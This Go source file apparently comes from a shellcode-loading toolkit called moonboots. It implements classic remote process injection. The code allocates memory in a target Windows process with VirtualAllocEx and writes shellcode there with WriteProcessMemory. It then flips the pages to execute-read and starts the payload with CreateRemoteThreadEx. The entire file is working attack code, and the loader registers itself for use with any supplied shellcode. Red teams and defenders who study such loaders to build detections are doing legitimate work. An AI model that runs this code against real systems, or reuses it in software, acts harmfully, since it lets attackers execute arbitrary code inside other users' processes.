package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

/*
This technique executes shellcode in a remote process using the following steps
 1. Get a handle to the target process
 1. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
 2. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
 3. Change the memory page permissions to Execute/Read with VirtualProtectEx
 4. Execute the entrypoint of the shellcode in the remote process with CreateRemoteThread
 5. Close the handle to the remote process

This technique leverages the functions from golang.org/x/sys/windows WHERE POSSIBLE to call Windows procedures instead of manually loading them
*/
const (
	LdrCreateRemoteThread = "createremotethread"
)

type CreateRemoteThreadLoader struct {
	Base
}

func init() {
	ldr := &CreateRemoteThreadLoader{}
	ldr.SuspendProcess = true
	ldr.Injector = true

	AvailableLoaders.Register(LdrCreateRemoteThread, ldr)
}

func (ldr CreateRemoteThreadLoader) ValidArchs() []string {
	return consts.VALID_ARCH_BOTH
}

func (ldr CreateRemoteThreadLoader) Run(shellcode []byte) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	log.Printf("Successfully got a handle to process %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Calling VirtualAllocEx on PID %d...", ldr.TargetProcess.ProcessId)

	addr, _, err := VirtualAllocEx.Call(uintptr(ldr.TargetProcess.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAlloc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed and returned 0")
	}

	log.Printf("Successfully allocated memory in PID %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Calling WriteProcessMemory on PID %d...", ldr.TargetProcess.ProcessId)
	_, _, err = WriteProcessMemory.Call(uintptr(ldr.TargetProcess.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling WriteProcessMemory: %s", err)
	}

	log.Printf("Successfully wrote shellcode to PID %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Calling VirtualProtectEx on PID %d...", ldr.TargetProcess.ProcessId)

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtectEx.Call(uintptr(ldr.TargetProcess.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtectEx: %s", err)
	}

	log.Printf("Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Call CreateRemoteThreadEx on PID %d...", ldr.TargetProcess.ProcessId)

	_, _, err = CreateRemoteThreadEx.Call(uintptr(ldr.TargetProcess.Process), 0, 0, addr, 0, 0, 0)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling CreateRemoteThreadEx: %s", err)
	}

	log.Printf("Successfully created a remote thread in PID %d", ldr.TargetProcess.ProcessId)

	return nil
}
